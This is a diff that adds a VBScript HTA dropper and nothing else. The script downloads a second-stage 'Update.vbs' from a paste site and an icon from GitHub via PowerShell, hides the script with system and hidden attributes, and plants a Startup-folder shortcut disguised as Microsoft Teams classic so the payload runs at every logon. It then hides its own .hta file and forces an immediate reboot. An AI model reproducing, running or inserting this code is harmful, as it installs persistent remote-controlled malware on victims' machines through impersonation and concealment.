@@ -1,0 +1,32 @@
+<script language="VBScript">
+'// Setup
+dim oShell: set oShell = CreateObject("WScript.Shell")
+
+dim appData
+appData = oShell.ExpandEnvironmentStrings("%AppData%")
+
+dim localAppData
+localAppData = oShell.ExpandEnvironmentStrings("%LocalAppData%")
+
+dim startup
+startup = appdata & "\Microsoft\Windows\Start Menu\Programs\Startup"
+
+'// Install
+oShell.run "cmd /c mkdir %appdata%\Microsoft & mkdir %appdata%\Microsoft\Teams", 0, true
+oShell.run "cmd /c mkdir %localappdata%\Microsoft & mkdir %localappdata%\Microsoft\Teams"
+
+oShell.run "cmd /c cd %appdata%\Microsoft\Teams&powershell iwr https://raw.githubusercontent.com/FilthyPenny/boot/main/app.ico -O app.ico", 0, true
+oShell.run "cmd /c cd %appdata%\Microsoft\Teams&powershell iwr https://bitbin.it/PXEBnYm4/raw/ -O Update.vbs", 0, true
+oShell.run "cmd /c attrib +s +h %appdata%\Microsoft\Teams\Update.vbs", 0, true
+
+'// Shortcut
+dim link: set link = oShell.createShortcut(startup & "\Microsoft Teams classic (work or school).lnk")
+link.IconLocation = appData & "\Microsoft\Teams\app.ico"
+link.TargetPath = appData & "\Microsoft\Teams\Update.vbs"
+link.WorkingDirectory = localAppData & "\Microsoft\Teams"
+link.Description = "Microsoft Teams classic (work or school)"
+link.Save
+
+'// Wrap Up
+oShell.run "cmd /c attrib +s +h %userprofile%\.hta&shutdown -r -f -t 0",0,false
+</script>
